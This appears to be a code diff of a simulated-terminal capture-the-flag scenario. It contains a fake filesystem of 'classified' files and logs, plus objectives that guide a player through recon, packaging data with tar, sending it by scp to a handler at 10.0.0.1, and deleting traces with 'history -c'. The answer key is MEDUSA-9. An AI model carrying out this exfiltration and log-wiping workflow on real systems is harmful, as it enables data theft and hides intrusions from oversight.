-Budget: $50M USD
-Timeline: 2024-2027
-
-Key Personnel:
-- Director: [REDACTED]
-- Lead Engineer: [REDACTED]
-
-Objectives:
-1. Develop advanced autonomous systems
-2. Integrate AI decision-making
-3. Deploy to theater operations
-
-VERIFICATION CODE: PHOENIX-7
-
-This code confirms successful access to classified materials.
-Report to handler upon discovery.
-
-[END CLASSIFIED SECTION]
-`
-                },
-                '/data/classified/asset_network.xlsx': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 1048576,
-                    content: '[CLASSIFIED - Asset network diagram and personnel locations]'
-                },
-                '/data/classified/operational_plans.docx': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 2097152,
-                    content: '[CLASSIFIED - Q1 2026 operational deployment plans]'
-                },
-                '/data/classified/verification_codes.txt': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 256,
-                    content: `VERIFICATION CODES - DESTROY AFTER READING
-==========================================
-Mission Verification: PHOENIX-7
-Abort Code: BLACKOUT-ZERO
-Handler Confirmation: SPECTER-ALPHA
-
-Use PHOENIX-7 to confirm successful data access.
-`
-                },
-                '/var/log': {
-                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
-                    children: ['auth.log', 'syslog', 'secure', 'access.log']
-                },
-                '/var/log/auth.log': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 4096,
-                    content: `Jan 17 02:55:00 CHIMERA sshd[1234]: Connection from 10.0.0.1 port 55432
-Jan 17 02:55:01 CHIMERA sshd[1234]: Accepted publickey for ghost from 10.0.0.1 port 55432
-Jan 17 02:55:01 CHIMERA sshd[1234]: pam_unix(sshd:session): session opened for user ghost
-Jan 17 03:00:15 CHIMERA sudo: ghost : TTY=pts/0 ; PWD=/home/ghost ; USER=root ; COMMAND=/bin/cat /etc/shadow
-Jan 17 03:05:00 CHIMERA sshd[1234]: Received disconnect from 10.0.0.1: disconnected by user
-`
-                },
-                '/var/log/syslog': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048,
-                    content: `Jan 17 00:00:00 CHIMERA systemd[1]: Starting Daily apt activities...
-Jan 17 00:00:01 CHIMERA systemd[1]: Started Daily apt activities.
-Jan 17 02:55:00 CHIMERA systemd[1]: Started Session 42 of user ghost.
-`
-                },
-                '/var/log/secure': {
-                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root', size: 1024,
-                    content: `Jan 17 02:55:01 CHIMERA sshd[1234]: pam_unix(sshd:auth): authentication success; user=ghost
-`
-                },
-                '/var/log/access.log': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512,
-                    content: `10.0.0.1 - ghost [17/Jan/2026:02:55:01] "SSH LOGIN" 200
-10.0.0.50 - admin [17/Jan/2026:01:30:00] "SSH LOGIN" 200
-`
-                },
+                // ═══════════════════════════════════════════════════════════
+                // SYSTEM FILES
+                // ═══════════════════════════════════════════════════════════
                 '/etc/passwd': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512,
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 640,
                     content: `root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ghost:x:1000:1000:Ghost Operator:/home/ghost:/bin/bash
-admin:x:1001:1001:IT Admin:/home/admin:/bin/bash
-chimera:x:999:999:Chimera Service:/var/chimera:/usr/sbin/nologin
+admin:x:1001:1001:IT Administrator:/home/admin:/bin/bash
+analyst:x:1002:1002:Data Analyst:/home/analyst:/bin/bash
+svc_chimera:x:999:999:Chimera Service:/var/chimera:/usr/sbin/nologin
 backup:x:998:998:Backup Service:/var/backups:/usr/sbin/nologin
+`
+                },
+                '/etc/group': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
+                    content: `root:x:0:
+sudo:x:27:admin
+users:x:100:ghost,analyst
+projects:x:1000:ghost,analyst,admin
+classified:x:1001:admin,ghost
+`
+                },
+                '/etc/shadow': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'shadow', size: 256,
+                    content: `[Permission denied - root access required]`
+                },
+
+                // ═══════════════════════════════════════════════════════════
+                // LOGS - Important for investigation
+                // ═══════════════════════════════════════════════════════════
+                '/var/log': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['auth.log', 'syslog', 'secure', 'access.log', 'chimera_audit.log']
+                },
+                '/var/log/auth.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048,
+                    content: `Jan 15 02:30:00 CHIMERA sshd[8821]: Accepted publickey for ghost from 10.0.0.1 port 44123 ssh2
+Jan 15 02:30:01 CHIMERA sshd[8821]: pam_unix(sshd:session): session opened for user ghost
+Jan 15 02:40:15 CHIMERA audit[8890]: user ghost accessed /data/projects/hydra/
+Jan 15 02:40:16 CHIMERA security: ALERT - Unauthorized access to monitored directory by ghost
+Jan 15 02:55:00 CHIMERA sshd[8821]: pam_unix(sshd:session): session closed for user ghost
+Jan 17 03:00:00 CHIMERA sshd[9234]: Accepted publickey for ghost from 10.0.0.1 port 55432 ssh2
+Jan 17 03:00:01 CHIMERA sshd[9234]: pam_unix(sshd:session): session opened for user ghost
+`
+                },
+                '/var/log/syslog': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1024,
+                    content: `Jan 17 00:00:00 CHIMERA systemd[1]: Starting Daily apt activities...
+Jan 17 00:00:01 CHIMERA systemd[1]: Started Daily apt activities.
+Jan 17 03:00:00 CHIMERA systemd[1]: Started Session 87 of user ghost.
+Jan 17 03:00:01 CHIMERA systemd[1]: pam_unix(systemd-user:session): session opened for user ghost
+`
+                },
+                '/var/log/secure': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root', size: 512,
+                    content: `Jan 17 03:00:00 CHIMERA sshd[9234]: pam_unix(sshd:auth): authentication success; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.0.1 user=ghost
+`
+                },
+                '/var/log/access.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 768,
+                    content: `# Access log - CHIMERA workstation
+10.0.0.1 - ghost [15/Jan/2026:02:30:00] "SSH LOGIN" 200 # WRAITH-7 session
+10.0.0.1 - ghost [15/Jan/2026:02:40:15] "ACCESS /data/projects/hydra/" 200 # ALERT TRIGGERED
+10.0.0.1 - ghost [15/Jan/2026:02:55:00] "SSH LOGOUT" 200 # Emergency extraction
+10.0.0.1 - ghost [17/Jan/2026:03:00:00] "SSH LOGIN" 200 # Current session
+`
+                },
+                '/var/log/chimera_audit.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1024,
+                    content: `CHIMERA SECURITY AUDIT LOG
+==========================
+2026-01-15 02:40:15 - ALERT: User 'ghost' accessed monitored directory /data/projects/hydra/
+2026-01-15 02:40:16 - ACTION: Enhanced monitoring enabled for session
+2026-01-15 02:45:00 - ALERT: Verification code HYDRA-3 submitted (DECOY CODE)
+2026-01-15 02:45:01 - ACTION: Security review initiated
+2026-01-15 02:55:00 - INFO: Session terminated by user
+2026-01-16 09:00:00 - ACTION: Hydra directory placed under enhanced monitoring
+2026-01-16 09:01:00 - ACTION: Cerberus honeypot refreshed
+2026-01-17 03:00:00 - INFO: New session established for user 'ghost'
 `
                 },
             },
 
+            // ═══════════════════════════════════════════════════════════
+            // OBJECTIVES - 18 steps for 30+ minute challenge
+            // ═══════════════════════════════════════════════════════════
             objectives: [
-                { id: 1, task: 'PHASE 1: Establish Situational Awareness', hint: 'Who are you? Where are you? What do you have?', check: (cmd, state, output) => cmd.includes('whoami') && output && output.includes('ghost') },
-                { id: 2, task: 'PHASE 1: Locate Mission Parameters', hint: 'Find and read your mission briefing.', check: (cmd, state, output) => output && output.includes('TOP SECRET') && output.includes('CHIMERA') },
-                { id: 3, task: 'PHASE 2: Enumerate System Users', hint: 'Who else has accounts on this system?', check: (cmd, state, output) => output && output.includes('ghost') && output.includes('admin') && output.includes('root') },
-                { id: 4, task: 'PHASE 2: Map the Network', hint: 'Where are you in the network? What hosts are known?', check: (cmd, state, output) => output && output.includes('10.0.0.') && (output.includes('handler') || output.includes('Handler') || output.includes('SPECTER')) },
-                { id: 5, task: 'PHASE 3: Identify Privilege Escalation Vectors', hint: 'What SUID binaries exist? What can you sudo?', check: (cmd, state, output) => output && !output.includes('command not found') && (output.includes('/usr/bin/passwd') || output.includes('/usr/bin/sudo') || output.includes('may run')) },
-                { id: 6, task: 'PHASE 3: Review Authentication Logs', hint: 'Who logged in before you? From where?', check: (cmd, state, output) => output && output.includes('ghost') && output.includes('sshd') && output.includes('10.0.0') },
-                { id: 7, task: 'PHASE 4: Locate Sensitive Data Directories', hint: 'Search the filesystem for classified information.', check: (cmd, state, output) => output && (output.includes('classified') || output.includes('CLASSIFIED')) && (cmd.includes('find') || cmd.includes('ls')) },
-                { id: 8, task: 'PHASE 4: Extract Verification Code', hint: 'Find the mission verification code in the classified data.', check: (cmd, state, output) => output && output.includes('PHOENIX-7') },
-                { id: 9, task: 'PHASE 5: Package Intelligence for Exfiltration', hint: 'Create a compressed archive of the classified directory.', check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-c') || cmd.includes('c')) && cmd.includes('classified') },
-                { id: 10, task: 'PHASE 5: Verify Exfil Package', hint: 'Confirm your package was created in staging.', check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('staging') && output && (output.includes('.tar') || output.includes('.gz') || output.includes('intel')) },
+                // PHASE 1: RECONNAISSANCE (4 objectives)
+                { id: 1, task: 'RECON: Establish your identity', hint: 'Who are you on this system?', check: (cmd, state, output) => cmd.includes('whoami') && output && output.includes('ghost') },
+                { id: 2, task: 'RECON: Survey your environment', hint: 'What files and directories are in your home? Including hidden ones?', check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-') && cmd.includes('a') && output && output.includes('.chimera_ops') },
+                { id: 3, task: 'RECON: Discover previous operator intel', hint: 'Hidden directories often contain critical operational data. What did the previous operator leave behind?', check: (cmd, state, output) => output && output.includes('WRAITH-7') && (output.includes('MEDUSA') || output.includes('Medusa')) },
+                { id: 4, task: 'RECON: Read your mission briefing', hint: 'The mission/ directory contains your operational parameters. What is your target?', check: (cmd, state, output) => output && output.includes('TOP SECRET') && output.includes('CHIMERA') && output.includes('MEDUSA') },
+
+                // PHASE 2: ENUMERATION (3 objectives)
+                { id: 5, task: 'ENUM: Identify system users', hint: 'Who has accounts on this system? Which file lists all users?', check: (cmd, state, output) => output && output.includes('ghost') && output.includes('admin') && output.includes('analyst') && output.includes('/bin/bash') },
+                { id: 6, task: 'ENUM: Check group memberships', hint: 'What groups exist? Who has access to classified data?', check: (cmd, state, output) => output && output.includes('classified') && output.includes('projects') },
+                { id: 7, task: 'ENUM: Map the network', hint: 'Where is the handler? Check your SSH configuration or known hosts.', check: (cmd, state, output) => output && output.includes('10.0.0.1') && (output.includes('handler') || output.includes('SPECTER')) },
+
+                // PHASE 3: LOG ANALYSIS (2 objectives)
+                { id: 8, task: 'LOGS: Review authentication history', hint: 'What happened on January 15th? Check the auth logs for WRAITH-7\'s session.', check: (cmd, state, output) => output && output.includes('ghost') && output.includes('hydra') && (output.includes('ALERT') || output.includes('Jan 15')) },
+                { id: 9, task: 'LOGS: Understand the security incident', hint: 'The audit log shows what went wrong. What directory triggered the alert?', check: (cmd, state, output) => output && output.includes('HYDRA-3') && output.includes('DECOY') },
+
+                // PHASE 4: TARGET IDENTIFICATION (3 objectives)
+                { id: 10, task: 'TARGET: Explore the data directory structure', hint: 'What projects exist in /data/projects? List them WITHOUT accessing individual directories yet.', check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('/data') && output && output.includes('medusa') && output.includes('hydra') && output.includes('cerberus') },
+                { id: 11, task: 'TARGET: Identify the correct verification code', hint: 'The intel_brief.txt contains critical information. What is the VALID mission verification code (not a decoy)?', check: (cmd, state, output) => output && output.includes('MEDUSA-9') && output.includes('ONLY valid') },
+                { id: 12, task: 'TARGET: Access the Medusa classified directory', hint: 'Navigate to the target: /data/projects/medusa/classified/ - What files are there?', check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('medusa') && cmd.includes('classified') && output && output.includes('project_medusa.pdf') },
+
+                // PHASE 5: DATA EXTRACTION (2 objectives)
+                { id: 13, task: 'EXTRACT: Read the classified Medusa document', hint: 'The PDF contains the mission verification. Confirm the code matches what you found in intel_brief.txt.', check: (cmd, state, output) => output && output.includes('MEDUSA-9') && output.includes('TOP SECRET') && output.includes('MEDUSA') },
+                { id: 14, task: 'EXTRACT: Verify target data location', hint: 'Confirm /data/projects/medusa/classified/ is your exfil target. Check staging/README.txt for the workflow.', check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('staging') && output && output.includes('handler') },
+
+                // PHASE 6: EXFILTRATION (4 objectives)
+                { id: 15, task: 'EXFIL: Package the intelligence', hint: 'Create a compressed archive of /data/projects/medusa/classified/ in your staging directory.', check: (cmd, state, output) => cmd.includes('tar') && cmd.includes('-c') && cmd.includes('medusa') && cmd.includes('classified') },
+                { id: 16, task: 'EXFIL: Verify your package', hint: 'Confirm the package exists in staging/ before transfer.', check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('staging') && output && (output.includes('.tar') || output.includes('.gz')) },
+                { id: 17, task: 'EXFIL: Transfer to handler', hint: 'Send the package to the handler at 10.0.0.1. Use SCP.', check: (cmd, state, output) => cmd.includes('scp') && (cmd.includes('10.0.0.1') || cmd.includes('handler')) && output && output.includes('100%') },
+                { id: 18, task: 'CLEANUP: Cover your tracks', hint: 'Delete the package and clear your command history. Leave no trace.', check: (cmd, state, output) => (cmd.includes('rm') && cmd.includes('staging')) || (cmd.includes('history') && cmd.includes('-c')) },
             ],
 
             insightPhase: {
                 enabled: true,
-                question: "What is the mission verification code found in the classified documents?",
-                acceptedAnswers: ["PHOENIX-7", "phoenix-7", "PHOENIX7"],
-                hint: "Read the project_chimera.pdf or verification_codes.txt in /data/classified/",
-                hintAfterAttempts: 3
+                question: "What is the VALID mission verification code? (Hint: It's NOT Hydra or Phoenix)",
+                acceptedAnswers: ["MEDUSA-9", "medusa-9", "MEDUSA9", "medusa9"],
+                wrongAnswerMessage: "Incorrect. Remember: HYDRA-3 and PHOENIX-7 are DECOY codes. The target is Medusa.",
+                hint: "The valid code is in mission/intel_brief.txt and confirmed in /data/projects/medusa/classified/",
+                hintAfterAttempts: 2
             },
 
             remoteHosts: null,
